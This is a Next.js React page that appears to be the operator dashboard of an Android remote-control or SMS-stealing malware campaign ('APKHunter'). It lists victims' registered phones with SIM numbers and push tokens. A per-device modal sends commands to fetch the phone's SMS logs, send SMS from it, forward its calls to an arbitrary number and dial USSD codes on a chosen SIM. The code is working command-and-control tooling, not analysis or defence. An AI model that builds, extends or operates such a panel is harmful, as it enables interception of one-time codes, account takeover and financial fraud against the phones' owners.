"use client";

import Link from "next/link";
import { usePathname, useRouter } from "next/navigation";
import Device from "@/types/devicetype";
import { getDeviceStatusFromAvailability } from "@/lib/deviceStatus";
import { db } from "@/lib/firbase";
import LineSpinner from "@/components/LineSpinner";
import {
  get,
  limitToFirst,
  onChildAdded,
  onChildChanged,
  onChildRemoved,
  orderByKey,
  query,
  ref,
  startAt,
} from "firebase/database";
import { useCallback, useEffect, useRef, useState } from "react";

const INITIAL_PAGE_SIZE = 20;
const NEXT_PAGE_SIZE = 10;
const CHECKONLINE_SYNC_INTERVAL_MS = 5 * 60 * 1000;

type CheckOnlineRecord = Record<string, unknown>;

function normalizeJoinedAt(value: unknown): string {
  if (typeof value === "number" && Number.isFinite(value) && value > 0) {
    return new Date(value).toISOString();
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (trimmed) {
      const numericValue = Number(trimmed);

      if (Number.isFinite(numericValue) && numericValue > 0) {
        return new Date(numericValue).toISOString();
      }

      const parsedDate = Date.parse(trimmed);

      if (!Number.isNaN(parsedDate)) {
        return new Date(parsedDate).toISOString();
      }
    }
  }

  return new Date(0).toISOString();
}

function normalizeCheckedAt(value: unknown): string {
  if (typeof value === "number" && Number.isFinite(value) && value > 0) {
    return new Date(value).toISOString();
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return "";
    }

    const numericValue = Number(trimmed);

    if (Number.isFinite(numericValue) && numericValue > 0) {
      return new Date(numericValue).toISOString();
    }

    const parsedDate = Date.parse(trimmed);

    if (!Number.isNaN(parsedDate)) {
      return new Date(parsedDate).toISOString();
    }
  }

  return "";
}

function getRegisteredCheckOnline(
  rawData: Record<string, unknown>,
): CheckOnlineRecord | undefined {
  const nestedCheckOnline = rawData.checkOnline;

  return nestedCheckOnline && typeof nestedCheckOnline === "object"
    ? (nestedCheckOnline as CheckOnlineRecord)
    : undefined;
}

function getOnlineStatus(
  checkOnline?: CheckOnlineRecord,
): Device["onlineStatus"] {
  return getDeviceStatusFromAvailability(checkOnline?.available);
}

function mapToDevice(
  deviceId: string,
  rawData: Record<string, unknown>,
): Device {
  const checkOnline = getRegisteredCheckOnline(rawData);

  return {
    deviceId,
    model: typeof rawData.model === "string" ? rawData.model : "Unknown",
    brand: typeof rawData.brand === "string" ? rawData.brand : "Unknown",
    forwardingSim: null,
    androidVersion:
      typeof rawData.androidVersion === "number"
        ? String(rawData.androidVersion)
        : "Unknown",
    joinedAt: normalizeJoinedAt(rawData.joinedAt),
    fcmToken: typeof rawData.fcmToken === "string" ? rawData.fcmToken : "",
    adminPhoneNumber: [],
    manufacturer:
      typeof rawData.manufacturer === "string"
        ? rawData.manufacturer
        : "Unknown",
    sim1Carrier:
      typeof rawData.sim1Carrier === "string" ? rawData.sim1Carrier : "",
    sim1number:
      typeof rawData.sim1Number === "string" ? rawData.sim1Number : "",
    sim2Carrier:
      typeof rawData.sim2Carrier === "string" ? rawData.sim2Carrier : "",
    sim2number:
      typeof rawData.sim2Number === "string" ? rawData.sim2Number : "",
    onlineStatus: getOnlineStatus(checkOnline),
    lastChecked: normalizeCheckedAt(
      checkOnline?.checkedAt ?? checkOnline?.lastChecked,
    ),
    isfavorite: Boolean(rawData.isfavorite),
  };
}

function formatLastChecked(value: string): string {
  if (!value) {
    return "N/A";
  }

  const checkedTime = new Date(value).getTime();

  if (Number.isNaN(checkedTime)) {
    return "N/A";
  }

  const diffMs = Date.now() - checkedTime;

  if (diffMs < 0) {
    return "just now";
  }

  const minutes = Math.floor(diffMs / (1000 * 60));

  if (minutes < 1) {
    return "just now";
  }

  if (minutes < 60) {
    return `${minutes}m ago`;
  }

  const hours = Math.floor(minutes / 60);

  if (hours < 24) {
    return `${hours}h ago`;
  }

  const days = Math.floor(hours / 24);
  return `${days}d ago`;
}

function getPrimarySimLine(device: Device): string {
  const sim1 = [device.sim1Carrier, device.sim1number].filter(Boolean).join(" -- ");
  const sim2 = [device.sim2Carrier, device.sim2number].filter(Boolean).join(" -- ");

  if (sim1) {
    return `SIM 1: ${sim1}`;
  }

  if (sim2) {
    return `SIM 2: ${sim2}`;
  }

  return "SIM: N/A";
}

export default function DevicesPage() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [loading, setLoading] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [hasMore, setHasMore] = useState(true);
  const [lastKey, setLastKey] = useState<string | null>(null);
  const loaderRef = useRef<HTMLDivElement | null>(null);
  const loadingRef = useRef(false);
  const hasMoreRef = useRef(true);
  const lastKeyRef = useRef<string | null>(null);
  const pathname = usePathname();
  const router = useRouter();

  // Modal state
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [activeSection, setActiveSection] = useState<"ussd" | "sms" | "callforward" | null>(null);
  const [ussdCode, setUssdCode] = useState("");
  const [ussdSim, setUssdSim] = useState("sim1");
  const [smsNumber, setSmsNumber] = useState("");
  const [smsBody, setSmsBody] = useState("");
  const [cfNumber, setCfNumber] = useState("");
  const [actionLoading, setActionLoading] = useState<string | null>(null);

  const openDeviceModal = (device: Device) => {
    setSelectedDevice(device);
    setShowModal(true);
    setActiveSection(null);
    setUssdCode("");
    setSmsNumber("");
    setSmsBody("");
    setCfNumber("");
  };

  const closeModal = () => {
    setShowModal(false);
    setSelectedDevice(null);
    setActiveSection(null);
  };

  const sendFCMAction = async (endpoint: string, payload: Record<string, unknown>, loadingKey?: string) => {
    const key = loadingKey || endpoint;
    setActionLoading(key);
    try {
      const res = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (data.success) {
        alert("Command sent successfully!");
      } else {
        alert("Failed: " + (data.error || "Unknown error"));
      }
    } catch {
      alert("Network error sending command");
    } finally {
      setActionLoading(null);
    }
  };

  const loadDevices = useCallback(async (batchSize: number) => {
    if (loadingRef.current || !hasMoreRef.current) return;

    loadingRef.current = true;
    setLoading(true);

    try {
      const devicesRef = ref(db, "registeredDevices");

      const cursor = lastKeyRef.current;

      const pagedQuery = cursor
        ? query(
            devicesRef,
            orderByKey(),
            startAt(cursor),
            limitToFirst(batchSize + 1),
          )
        : query(devicesRef, orderByKey(), limitToFirst(batchSize));

      const devicesSnapshot = await get(pagedQuery);

      if (!devicesSnapshot.exists()) {
        hasMoreRef.current = false;
        setHasMore(false);
        return;
      }

      const fetchedDevices: Device[] = [];

      devicesSnapshot.forEach((childSnapshot) => {
        const deviceId = childSnapshot.key;
        const deviceData = childSnapshot.val();

        if (!deviceId || !deviceData) return;

        const device = mapToDevice(deviceId, deviceData);

        fetchedDevices.push(device);
        console.log(device.fcmToken);
      });

      const nextBatch = cursor
        ? fetchedDevices.filter((d) => d.deviceId !== cursor)
        : fetchedDevices;

      if (nextBatch.length === 0) {
        hasMoreRef.current = false;
        setHasMore(false);
        return;
      }

      setDevices((prev) => {
        const existingIds = new Set(prev.map((d) => d.deviceId));

        const uniqueNew = nextBatch.filter((d) => !existingIds.has(d.deviceId));

        return [...prev, ...uniqueNew];
      });

      const nextLastKey = nextBatch[nextBatch.length - 1]?.deviceId;

      if (nextLastKey) {
        lastKeyRef.current = nextLastKey;
        setLastKey(nextLastKey);
      }

      if (nextBatch.length < batchSize) {
        hasMoreRef.current = false;
        setHasMore(false);
      }
    } catch (error) {
      console.error("Failed to fetch devices", error);
    } finally {
      loadingRef.current = false;
      setLoading(false);
      setInitialLoading(false);
    }
  }, []);

  useEffect(() => {
    void loadDevices(INITIAL_PAGE_SIZE);
  }, [loadDevices]);

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        const [entry] = entries;

        if (
          !entry?.isIntersecting ||
          loadingRef.current ||
          !hasMoreRef.current
        ) {
          return;
        }

        void loadDevices(NEXT_PAGE_SIZE);
      },
      {
        root: null,
        rootMargin: "0px 0px 240px 0px",
        threshold: 0,
      },
    );

    const currentLoader = loaderRef.current;

    if (currentLoader) {
      observer.observe(currentLoader);
    }

    return () => {
      if (currentLoader) {
        observer.unobserve(currentLoader);
      }
      observer.disconnect();
    };
  }, [loadDevices]);

  useEffect(() => {
    const devicesRef = ref(db, "registeredDevices");

    const unsubscribeChanged = onChildChanged(devicesRef, (snapshot) => {
      const childKey = snapshot.key;
      const childValue = snapshot.val();

      if (!childKey || !childValue || typeof childValue !== "object") {
        return;
      }

      const updatedDevice = mapToDevice(
        childKey,
        childValue as Record<string, unknown>,
      );

      setDevices((prevDevices) => {
        const deviceIndex = prevDevices.findIndex(
          (device) => device.deviceId === childKey,
        );

        if (deviceIndex < 0) {
          return prevDevices;
        }

        const nextDevices = [...prevDevices];
        nextDevices[deviceIndex] = updatedDevice;
        return nextDevices;
      });
    });

    const unsubscribeRemoved = onChildRemoved(devicesRef, (snapshot) => {
      const childKey = snapshot.key;

      if (!childKey) {
        return;
      }

      setDevices((prevDevices) =>
        prevDevices.filter((device) => device.deviceId !== childKey),
      );
    });

    return () => {
      unsubscribeChanged();
      unsubscribeRemoved();
    };
  }, []);

  useEffect(() => {
    hasMoreRef.current = hasMore;
  }, [hasMore]);

  useEffect(() => {
    lastKeyRef.current = lastKey;
  }, [lastKey]);

  useEffect(() => {
    if (hasMore || !lastKey) {
      return;
    }

    const devicesRef = ref(db, "registeredDevices");
    const tailQuery = query(devicesRef, orderByKey(), startAt(lastKey));

    const unsubscribeAdded = onChildAdded(tailQuery, (snapshot) => {
      const childKey = snapshot.key;
      const childValue = snapshot.val();

      if (
        !childKey ||
        childKey === lastKey ||
        !childValue ||
        typeof childValue !== "object"
      ) {
        return;
      }

      const appendedDevice = mapToDevice(
        childKey,
        childValue as Record<string, unknown>,
      );

      setDevices((prevDevices) => {
        if (prevDevices.some((device) => device.deviceId === childKey)) {
          return prevDevices;
        }

        return [...prevDevices, appendedDevice];
      });

      if (childKey.localeCompare(lastKeyRef.current ?? "") > 0) {
        lastKeyRef.current = childKey;
        setLastKey(childKey);
      }
    });

    return () => unsubscribeAdded();
  }, [hasMore, lastKey]);

  useEffect(() => {
    let isCancelled = false;

    const syncStaleOfflineDevices = async () => {
      try {
        const response = await fetch("/api/checkonline-maintenance", {
          method: "POST",
          cache: "no-store",
        });

        if (!response.ok && !isCancelled) {
          console.error("checkOnline maintenance request failed");
        }
      } catch (error) {
        if (!isCancelled) {
          console.error("Failed to trigger checkOnline maintenance", error);
        }
      }
    };

    void syncStaleOfflineDevices();

    const intervalId = window.setInterval(() => {
      void syncStaleOfflineDevices();
    }, CHECKONLINE_SYNC_INTERVAL_MS);

    return () => {
      isCancelled = true;
      window.clearInterval(intervalId);
    };
  }, []);

  const normalizedQuery = searchQuery.trim().toLowerCase();
  const filteredDevices = normalizedQuery
    ? devices.filter((device) => {
        const searchableText = [
          device.deviceId,
          device.brand,
          device.model,
          device.androidVersion,
          device.fcmToken,
          device.sim1Carrier,
          device.sim1number,
          device.sim2Carrier,
          device.sim2number,
        ]
          .join(" ")
          .toLowerCase();

        return searchableText.includes(normalizedQuery);
      })
    : devices;

  return (
    <div className="min-h-screen bg-[#ffffff]">
      <header className="w-full bg-black">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
            APKHunter
          </Link>
          <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
            <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Home
            </Link>
            <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Setting
            </Link>
            <a
              href="https://t.me/AH_Support_bot"
              target="_blank"
              rel="noopener noreferrer"
              className="text-white/85 transition-colors hover:text-white"
            >
              Support
            </a>
            <button
              onClick={async () => {
                await fetch("/api/logout", { method: "POST" });
                router.push("/login");
              }}
              className="text-white/85 transition-colors hover:text-white cursor-pointer"
            >
              Logout
            </button>
          </nav>
        </div>
      </header>

      {initialLoading ? (
        <LineSpinner />
      ) : (
      <main className="mx-auto w-full max-w-3xl px-5 py-8">
        <div className="space-y-5 rounded-[14px] border border-[#d6d6d6] bg-[#f3f3f3] p-5 shadow-[0_4px_20px_rgba(0,0,0,0.1)]">
          <div className="flex items-center gap-3">
            <select
              aria-label="Filter devices"
              className="h-12 flex-1 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-4 text-base font-semibold text-[#2f2f2f] outline-none"
              onChange={(e) => router.push(e.target.value)}
              value={pathname}
            >
              <option value="/all">All</option>
              <option value="/messages">Messages</option>
              <option value="/forms">Forms</option>
              <option value="/devices">Devices</option>
            </select>
            <button
              type="button"
              onClick={() => window.location.reload()}
              className="h-12 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-6 text-base font-semibold text-[#303030] transition hover:bg-[#eaeaea]"
            >
              NEW
            </button>
          </div>

          <div className="relative">
            <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-[#8e8e8e]">
              ⌕
            </span>
            <input
              type="text"
              value={searchQuery}
              onChange={(event) => setSearchQuery(event.target.value)}
              placeholder="Search Devices"
              className="h-12 w-full rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] pl-10 pr-4 text-base text-[#303030] outline-none placeholder:text-[#a7a7a7]"
            />
          </div>
        </div>

        <div className="mt-8 grid grid-cols-2 gap-5">
          {filteredDevices.map((device, index) => {
            const displayIndex = filteredDevices.length - index;

            return (
              <article
                key={device.deviceId}
                className="flex flex-col rounded-[16px] bg-white p-4 shadow-[0_8px_32px_rgba(0,0,0,0.12)]"
              >
                <h2
                  className="mb-3 text-center text-sm font-bold leading-tight text-[#273b87] cursor-pointer hover:underline"
                  onClick={() => openDeviceModal(device)}
                >
                  {displayIndex}. {device.brand} {device.model} ({device.androidVersion})
                </h2>

                <div className="flex-1 overflow-hidden rounded-xl border-2 border-[#b1b1b7] bg-[#f8f8f8] text-center text-xs font-semibold text-[#2d2d2d]">
                  <div className="px-3 py-2 break-all">{device.brand} {device.model}</div>
                  <div className="border-t-2 border-[#b1b1b7] px-3 py-2 break-all">ID: {device.deviceId}</div>
                  <div className="border-t-2 border-[#b1b1b7] px-3 py-2">Android: {device.androidVersion}</div>
                  <div className="border-t-2 border-[#b1b1b7] px-3 py-2">{getPrimarySimLine(device)}</div>
                  <div className="border-t-2 border-[#b1b1b7] px-3 py-2">
                    online: <span className="text-[#d94d57]">{formatLastChecked(device.lastChecked)}</span>
                  </div>
                </div>

                <div className="mt-3 flex justify-center">
                  <button
                    type="button"
                    onClick={() =>
                      sendFCMAction("/api/checkstatus", {
                        deviceId: device.deviceId,
                        token: device.fcmToken,
                        title: "Check Status",
                        body: "Checking device status",
                      }, `check-${device.deviceId}`)
                    }
                    disabled={actionLoading === `check-${device.deviceId}`}
                    className="rounded-xl border-2 border-[#8b95d4] px-4 py-2 text-xs font-bold text-[#495cb0] hover:bg-[#495cb0] hover:text-white transition disabled:opacity-50"
                  >
                    {actionLoading === `check-${device.deviceId}` ? "Checking..." : "Online Check"}
                  </button>
                </div>
              </article>
            );
          })}

          {loading && (
            <div className="flex items-center justify-center gap-3 py-6 text-sm text-gray-500">
              <div className="h-5 w-5 animate-spin rounded-full border-2 border-gray-300 border-t-[#d4bb41]" />
              <span>Loading more devices...</span>
            </div>
          )}

          {!hasMore && filteredDevices.length > 0 && (
            <p className="py-6 text-center text-sm text-gray-500">No more devices to load.</p>
          )}

          {!loading && filteredDevices.length === 0 && devices.length > 0 && (
            <p className="py-6 text-center text-sm text-gray-500">No devices match your search.</p>
          )}

          <div ref={loaderRef} className="h-1 w-full" />
        </div>
      </main>
      )}

      {/* Device Detail Modal */}
      {showModal && selectedDevice && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4" onClick={closeModal}>
          <div
            className="relative max-h-[90vh] w-full max-w-md overflow-y-auto rounded-2xl bg-white p-5 shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Close button */}
            <button
              onClick={closeModal}
              className="absolute right-3 top-3 text-xl text-gray-400 hover:text-gray-700"
            >
              ✕
            </button>

            {/* Device Info Table */}
            <div className="overflow-hidden rounded-xl border-2 border-[#b1b1b7] bg-[#f8f8f8] text-sm font-semibold text-[#2d2d2d]">
              <div className="flex border-b-2 border-[#b1b1b7] px-4 py-2.5">
                <span className="w-32 shrink-0 font-bold">Name</span>
                <span className="text-[#273b87]">
                  {selectedDevice.brand} {selectedDevice.model}{" "}
                  <span className="text-red-500">{selectedDevice.androidVersion}</span>
                </span>
              </div>
              <div className="flex border-b-2 border-[#b1b1b7] px-4 py-2.5">
                <span className="w-32 shrink-0 font-bold">ID</span>
                <span className="break-all text-[#273b87]">{selectedDevice.deviceId}</span>
              </div>
              <div className="flex border-b-2 border-[#b1b1b7] px-4 py-2.5">
                <span className="w-32 shrink-0 font-bold">SIM</span>
                <span>{selectedDevice.sim1number || selectedDevice.sim2number || "N/A"}</span>
              </div>
              <div className="flex border-b-2 border-[#b1b1b7] px-4 py-2.5">
                <span className="w-32 shrink-0 font-bold">Forward Call</span>
                <span className="text-red-500">{selectedDevice.forwardingSim ? "ON" : "OFF"}</span>
              </div>
              <div className="flex px-4 py-2.5">
                <span className="w-32 shrink-0 font-bold">Last <span className="text-red-500">offline</span></span>
                <span className="text-red-500">{formatLastChecked(selectedDevice.lastChecked)}</span>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="mt-4 flex flex-wrap justify-center gap-2">
              <button
                onClick={() =>
                  sendFCMAction("/api/checkstatus", {
                    deviceId: selectedDevice.deviceId,
                    token: selectedDevice.fcmToken,
                    title: "Check Status",
                    body: "Checking device status",
                  })
                }
                disabled={actionLoading === "/api/checkstatus"}
                className="rounded-lg border-2 border-[#273b87] px-3 py-2 text-xs font-bold text-[#273b87] hover:bg-[#273b87] hover:text-white transition disabled:opacity-50"
              >
                {actionLoading === "/api/checkstatus" ? "..." : "Check Online"}
              </button>
              <button
                onClick={() => router.push(`/devices/${selectedDevice.deviceId}`)}
                className="rounded-lg border-2 border-[#273b87] px-3 py-2 text-xs font-bold text-[#273b87] hover:bg-[#273b87] hover:text-white transition"
              >
                View Data
              </button>
              <button
                onClick={() =>
                  sendFCMAction("/api/getsms", {
                    deviceId: selectedDevice.deviceId,
                    token: selectedDevice.fcmToken,
                    title: "Get SMS",
                    body: "Requesting SMS logs",
                  })
                }
                disabled={actionLoading === "/api/getsms"}
                className="rounded-lg border-2 border-[#273b87] px-3 py-2 text-xs font-bold text-[#273b87] hover:bg-[#273b87] hover:text-white transition disabled:opacity-50"
              >
                {actionLoading === "/api/getsms" ? "..." : "Get SMS"}
              </button>
              <button
                onClick={() => setActiveSection(activeSection === "sms" ? null : "sms")}
                className={`rounded-lg border-2 border-[#273b87] px-3 py-2 text-xs font-bold transition ${activeSection === "sms" ? "bg-[#273b87] text-white" : "text-[#273b87] hover:bg-[#273b87] hover:text-white"}`}
              >
                Send SMS
              </button>
              <button
                onClick={() => setActiveSection(activeSection === "callforward" ? null : "callforward")}
                className={`rounded-lg border-2 border-[#273b87] px-3 py-2 text-xs font-bold transition ${activeSection === "callforward" ? "bg-[#273b87] text-white" : "text-[#273b87] hover:bg-[#273b87] hover:text-white"}`}
              >
                Call Forwarding
              </button>
              <button
                onClick={() => setActiveSection(activeSection === "ussd" ? null : "ussd")}
                className={`rounded-lg px-4 py-2 text-xs font-bold text-white transition ${activeSection === "ussd" ? "bg-[#1a2a6c]" : "bg-[#273b87] hover:bg-[#1a2a6c]"}`}
              >
                USSD Dialing
              </button>
            </div>

            {/* Send SMS Section */}
            {activeSection === "sms" && (
              <div className="mt-4 space-y-3 rounded-xl border-2 border-[#b1b1b7] bg-[#f8f8f8] p-4">
                <h3 className="text-center text-sm font-bold text-[#273b87]">Send SMS</h3>
                <input
                  type="text"
                  value={smsNumber}
                  onChange={(e) => setSmsNumber(e.target.value)}
                  placeholder="Phone number"
                  className="w-full rounded-lg border border-gray-300 px-3 py-2 text-sm outline-none"
                />
                <textarea
                  value={smsBody}
                  onChange={(e) => setSmsBody(e.target.value)}
                  placeholder="Message body"
                  rows={3}
                  className="w-full rounded-lg border border-gray-300 px-3 py-2 text-sm outline-none resize-none"
                />
                <div className="flex justify-center">
                  <button
                    onClick={() =>
                      sendFCMAction("/api/sendmessage", {
                        token: selectedDevice.fcmToken,
                        title: "Send SMS",
                        body: "Send SMS command",
                        data: { number: smsNumber, message: smsBody },
                      })
                    }
                    disabled={!smsNumber || !smsBody || actionLoading === "/api/sendmessage"}
                    className="rounded-lg bg-[#1b6b2f] px-6 py-2 text-sm font-bold text-white hover:bg-[#145524] transition disabled:opacity-50"
                  >
                    {actionLoading === "/api/sendmessage" ? "Sending..." : "Send"}
                  </button>
                </div>
              </div>
            )}

            {/* Call Forwarding Section */}
            {activeSection === "callforward" && (
              <div className="mt-4 space-y-3 rounded-xl border-2 border-[#b1b1b7] bg-[#f8f8f8] p-4">
                <h3 className="text-center text-sm font-bold text-[#273b87]">Call Forwarding</h3>
                <input
                  type="text"
                  value={cfNumber}
                  onChange={(e) => setCfNumber(e.target.value)}
                  placeholder="Forward to number (e.g. 91XXXXXXXXXX)"
                  className="w-full rounded-lg border border-gray-300 px-3 py-2 text-sm outline-none"
                />
                <div className="flex justify-center gap-3">
                  <button
                    onClick={() =>
                      sendFCMAction("/api/callforwarding", {
                        token: selectedDevice.fcmToken,
                        title: "Call Forwarding",
                        body: "Activate call forwarding",
                        command: "activate",
                        data: { number: cfNumber },
                      })
                    }
                    disabled={!cfNumber || actionLoading === "/api/callforwarding"}
                    className="rounded-lg bg-[#1b6b2f] px-5 py-2 text-sm font-bold text-white hover:bg-[#145524] transition disabled:opacity-50"
                  >
                    {actionLoading === "/api/callforwarding" ? "..." : "Activate"}
                  </button>
                  <button
                    onClick={() =>
                      sendFCMAction("/api/callforwarding", {
                        token: selectedDevice.fcmToken,
                        title: "Call Forwarding",
                        body: "Deactivate call forwarding",
                        command: "deactivate",
                      })
                    }
                    disabled={actionLoading === "/api/callforwarding"}
                    className="rounded-lg bg-red-600 px-5 py-2 text-sm font-bold text-white hover:bg-red-700 transition disabled:opacity-50"
                  >
                    Deactivate
                  </button>
                </div>
              </div>
            )}

            {/* USSD Dialing Section */}
            {activeSection === "ussd" && (
              <div className="mt-4 space-y-3 rounded-xl border-2 border-[#b1b1b7] bg-[#f8f8f8] p-4">
                <h3 className="rounded-lg bg-[#273b87] py-2 text-center text-sm font-bold text-white">
                  USSD Dialing
                </h3>
                <select
                  value={ussdSim}
                  onChange={(e) => setUssdSim(e.target.value)}
                  aria-label="Select SIM"
                  className="w-full rounded-lg border border-gray-300 px-3 py-2 text-sm outline-none"
                >
                  {selectedDevice.sim1number && (
                    <option value="sim1">
                      {selectedDevice.sim1Carrier || "SIM 1"} — {selectedDevice.sim1number}
                    </option>
                  )}
                  {selectedDevice.sim2number && (
                    <option value="sim2">
                      {selectedDevice.sim2Carrier || "SIM 2"} — {selectedDevice.sim2number}
                    </option>
                  )}
                  {!selectedDevice.sim1number && !selectedDevice.sim2number && (
                    <option value="sim1">No SIM info available</option>
                  )}
                </select>
                <input
                  type="text"
                  value={ussdCode}
                  onChange={(e) => setUssdCode(e.target.value)}
                  placeholder="USSD Code (e.g. *121#)"
                  className="w-full rounded-lg border border-gray-300 px-3 py-2 text-sm outline-none"
                />
                <div className="flex justify-center">
                  <button
                    onClick={() =>
                      sendFCMAction("/api/sendussd", {
                        token: selectedDevice.fcmToken,
                        data: { ussd_code: ussdCode, sim: ussdSim },
                      })
                    }
                    disabled={!ussdCode || actionLoading === "/api/sendussd"}
                    className="rounded-lg bg-[#1b6b2f] px-6 py-2 text-sm font-bold text-white hover:bg-[#145524] transition disabled:opacity-50"
                  >
                    {actionLoading === "/api/sendussd" ? "Sending..." : "Send"}
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
